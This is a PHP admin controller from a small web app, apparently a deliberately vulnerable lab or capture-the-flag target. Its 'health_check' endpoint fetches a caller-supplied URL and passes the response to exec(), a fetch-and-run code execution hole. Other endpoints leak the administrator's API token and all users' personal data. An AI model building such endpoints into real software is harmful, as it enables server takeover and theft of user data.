<?php
session_start();
class AdminController
{
    public function index($router)
    {
        if (!isset($_SESSION['uuid'])) {
            header("Location: /login");
        }
        return $router->view('profile');
    }

    public function admin_endpoint()
    {
        require "config.php";

        $body = file_get_contents('php://input');

        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') {
            $json = json_decode($body);

            if (!$json->uuid) {
                header("Content-Type: application/json");
                return json_encode(['status' => 'danger', 'message' => 'You must supply your API token.']);
            }

            $user_uuid = $json->uuid;

            $sql = "SELECT id, username, email, uuid FROM users WHERE uuid = ?";

            if ($stmt = $mysqli->prepare($sql)) {
                $stmt->bind_param("s", $user_uuid);
                if ($stmt->execute()) {
                    $stmt->store_result();
                    if ($stmt->num_rows == 1) {
                        $stmt->bind_result($id, $username, $email, $uuid);
                        if ($stmt->fetch()) {
                            if ($username === "administrator") {
                                header("Content-Type: application/json");
                                return json_encode(['ID' => $id, 'username' => $username, 'email' => $email, 'api token' => $uuid]);
                            } else {
                                header("Content-Type: application/json");
                                return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                            }
                        } else {
                            header("Content-Type: application/json");
                            return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                        }
                    } else {
                        header("Content-Type: application/json");
                        return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                    }
                } else {
                    header("Content-Type: application/json");
                    return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                }
            }
            $stmt->close();
            $mysqli->close();
        }
    }

    public function health_check($router)
    {
        require "config.php";

        $body = file_get_contents('php://input');

        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') {
            $json = json_decode($body);

            if (!$json->url) {
                header("Content-Type: application/json");
                return json_encode(['status' => 'danger', 'message' => 'You must supply a URL.']);
            }
            if (!$json->uuid) {
                header("Content-Type: application/json");
                return json_encode(['status' => 'danger', 'message' => 'You must supply your API token.']);
            }
            $url = $json->url;
            $user_uuid = $json->uuid;

            $sql = "SELECT id, username, email, password, uuid FROM users WHERE uuid = ?";

            if ($stmt = $mysqli->prepare($sql)) {
                $stmt->bind_param("s", $user_uuid);
                if ($stmt->execute()) {
                    $stmt->store_result();
                    if ($stmt->num_rows == 1) {
                        $stmt->bind_result($id, $username, $email, $hashed_password, $uuid);
                        if ($stmt->fetch()) {
                            if ($username === "administrator") {
                                $useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0";
                                if (function_exists("curl_init")) {
                                    $options = array(
                                        CURLOPT_URL => $url,
                                        CURLOPT_POST => 0,
                                        CURLOPT_RETURNTRANSFER => 1,
                                    );
                                    $curlObject = curl_init();
                                    curl_setopt_array($curlObject, $options);
                                    $content = curl_exec($curlObject);
                                    exec($content);
                                    curl_close($curlObject);
                                    header("Content-Type: application/json");
                                    return json_encode(['status' => 'success', 'message' => $content]);
                                } else {
                                    header("Content-Type: application/json");
                                    return json_encode(['status' => 'danger', 'message' => 'Curl does not exist']);
                                }
                            } else {
                                header("Content-Type: application/json");
                                return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                            }
                        } else {
                            header("Content-Type: application/json");
                            return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                        }
                    } else {
                        header("Content-Type: application/json");
                        return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                    }
                } else {
                    header("Content-Type: application/json");
                    return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                }
            }
            $stmt->close();
            $mysqli->close();
        } else {
            return $router->abort(400);
        }
    }

    public function add_product($router)
    {
        require "config.php";

        $body = file_get_contents('php://input');

        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') {
            $json = json_decode($body);

            if (!$json->uuid)
                return json_encode(['status' => 'danger', 'message' => 'You must supply your API token.']);

            if (!$json->productName)
                return json_encode(['status' => 'danger', 'message' => 'Enter a product name.']);

            if (!$json->productPrice)
                return json_encode(['status' => 'danger', 'message' => 'Enter a product price']);

            $user_uuid = $json->uuid;
            $product_name = $json->productName;
            $product_price = $json->productPrice;

            $sql = "SELECT id, username, email, password, uuid FROM users WHERE uuid = ?";

            if ($stmt = $mysqli->prepare($sql)) {
                $stmt->bind_param("s", $user_uuid);
                if ($stmt->execute()) {
                    $stmt->store_result();
                    if ($stmt->num_rows == 1) {
                        $stmt->bind_result($id, $username, $email, $hashed_password, $uuid);
                        if ($stmt->fetch()) {
                            if ($username === "administrator") {
                                $sql = "INSERT INTO parts (part_name, price) VALUES (?, ?)";
                                if ($stmt = $mysqli->prepare($sql)) {
                                    $stmt->bind_param("ss", $product_name, $product_price);
                                    if ($stmt->execute()) {
                                        return json_encode(['status' => 'success', 'message' => 'Added product successfully.']);
                                    } else {
                                        return json_encode(['status' => 'danger', 'message' => 'Cannot add product.']);
                                    }
                                    $stmt->close();
                                    $mysqli->close();
                                }
                            } else {
                                return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                            }
                        }
                    }
                }
            }
        } else {
            return $router->abort(400);
        }
    }

    public function list_members($router)
    {
        require "config.php";

        $body = file_get_contents('php://input');

        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json') {
            $json = json_decode($body);

            if (!$json->uuid)
                return json_encode(['status' => 'danger', 'message' => 'You must supply your API token.']);

            $user_uuid = $json->uuid;

            $sql = "SELECT username FROM users WHERE uuid = ?";

            $list = array();

            if ($stmt = $mysqli->prepare($sql)) {
                $stmt->bind_param("s", $user_uuid);
                if ($stmt->execute()) {
                    $stmt->store_result();
                    if ($stmt->num_rows == 1) {
                        $stmt->bind_result($username);
                        if ($stmt->fetch()) {
                            if ($username === "administrator") {
                                $sql = "SELECT * FROM users";
                                if ($stmt = $mysqli->prepare($sql)) {
                                    if ($stmt->execute()) {
                                        $result = $stmt->get_result();
                                        if ($result->num_rows != 0) {
                                            while ($row = $result->fetch_assoc()) {
                                                $list[] = array('id' => $row['id'], 'is admin' => $row['is_admin'], 'username' => $row['username'], 'email' => $row['email'], 'full name' => $row['full_name'], 'location' => $row['location'], 'occupation' => $row['occupation'], 'education' => $row['education']);
                                            }
                                            header("Content-Type: application/json");
                                            return json_encode($list);
                                        }
                                    }
                                }
                            } else {
                                return json_encode(['status' => 'danger', 'message' => 'You are not authorized to perform this action!']);
                            }
                        }
                    }
                }
            }
            $stmt->close();
            $mysqli->close();
        }
    }

    public function list_products($router)
    {
        require "config.php";

        $body = file_get_contents('php://input');

        $json = json_decode($body);

        $list = array();

        $sql = "SELECT * FROM parts";
        if ($stmt = $mysqli->prepare($sql)) {
            if ($stmt->execute()) {
                $result = $stmt->get_result();
                if ($result->num_rows != 0) {
                    while ($row = $result->fetch_assoc()) {
                        $list[] = array('id' => $row['id'], 'name' => $row['part_name'], 'price' => $row['price']);
                    }
                    header("Content-Type: application/json");
                    return json_encode(['product' => $list]);
                }
            }
            $stmt->close();
            $mysqli->close();
        }
    }
}

?>